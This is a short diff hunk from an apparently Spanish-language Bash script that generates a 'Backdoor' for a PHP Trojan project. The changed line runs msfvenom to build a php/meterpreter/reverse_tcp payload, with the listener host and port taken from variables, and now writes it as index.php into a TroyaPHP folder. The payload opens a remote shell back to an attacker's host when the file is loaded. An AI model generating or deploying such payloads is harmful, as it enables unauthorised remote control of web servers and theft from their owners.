@@ -64,7 +64,7 @@ echo " [+]Generando Backdoor ..."
 echo ""
 setterm -foreground green
 #Ejecutar msfvenom
-msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > index.php
+msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > /$HOME/TroyaPHP/index.php
 
 echo "
 #! /bin/bash
